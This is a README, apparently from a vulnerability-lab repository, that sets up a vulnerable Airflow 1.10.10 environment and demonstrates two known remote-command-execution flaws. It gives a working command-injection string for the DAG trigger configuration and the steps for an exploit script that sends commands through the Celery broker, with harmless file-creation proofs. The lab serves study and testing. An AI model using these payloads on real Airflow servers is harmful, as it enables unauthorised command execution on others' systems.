@@ -1,0 +1,91 @@
+# Airflow 1.10.10 Multiple Vulnerability Exploits
+
+[中文版本(Chinese version)](./README.zh-cn.md)
+
+Airflow is an open source, distributed task scheduling framework. It assembles a workflow with subordinate and subordinate dependencies into a directed acyclic graph.
+
+The 1.10.10 docker-compose file is modified from the docker-compose file provided by airflow 2.x.
+
+Airflow configuration uses CeleryExecutor for task execution, so the command execution result needs to be viewed in the CeleryWorker  container.
+
+Since there are many components to be started, it may be a bit stuck. Please prepare more than 2G of memory for the use of the virtual machine.
+
+## Vulnerability Environment
+
+Execute the following commands to start airflow 1.10.10
+
+```bash
+#Initialize the database
+docker-compose run airflow-init initdb
+#Start service
+docker-compsoe up -d
+```
+
+## Exploits
+
+### CVE-2020-11978 - RCE/command execution in example dag
+
+Visit `http://host:8080` to enter the airflow management terminal, and change the Off in front of `example_trigger_target_dag` to On:
+
+![image-20210701142307744](README.assets/image-20210701142307744.png)
+
+Then click the Triger button and enter in `Configuration JSON`: `{"message":"'\";touch /tmp/airflow_dag_success;#"}`, then click `Trigger` to execute dag
+
+![image-20210701142758977](README.assets/image-20210701142758977.png)
+
+Wait a few seconds to see the execution of `success`
+
+![image-20210701142948275](README.assets/image-20210701142948275.png)
+
+Go to the CeleryWorker container to view:
+
+```
+docker exec -it [celeryworker container name] ls -l /tmp
+```
+
+You can see that the airflow_dag_success file was successfully created:
+
+![image-20210701143152868](README.assets/image-20210701143152868-1625122787851.png)
+
+### CVE-2020-11981 - Command injection via Celery broker
+
+Airflow uses Celery version 4.0 or higher, so it cannot be exploited through pickle deserialization vulnerability, but it can execute any command by issuing the `airflow.executors.celery_executor.execute_command` task for starting the task. The parameter is the command execution. The required array in.
+
+The exploit script `exploit_airflow_celery.py` only supports use under python3, and the command `touch /tmp/airflow_celery_success` is executed by default
+
+```
+pip install redis
+python exploit_airflow_celery.py [HostIP]
+```
+
+View Results:
+
+```bash
+docker logs [celeryworker container name]
+```
+
+You can see the following task messages:
+
+![image-20210701143950658](README.assets/image-20210701143950658.png)
+
+```
+docker exec -it [celeryworker container name] ls -l /tmp
+```
+
+You can see that the file `airflow_celery_success` was successfully created
+
+![image-20210701144043792](README.assets/image-20210701144043792.png)
+
+## Reference
+
+https://docs.celeryproject.org/en/stable/userguide/configuration.html
+
+https://www.bookstack.cn/read/celery-3.1.7-zh/8d5b10e3439dbe1f.md#dhfmrk
+
+https://docs.celeryproject.org/en/stable/userguide/calling.html#serializers
+
+https://www.jianshu.com/p/52552c075bc0
+
+https://www.runoob.com/w3cnote/python-redis-intro.html
+
+https://blog.csdn.net/SKI_12/article/details/85015803
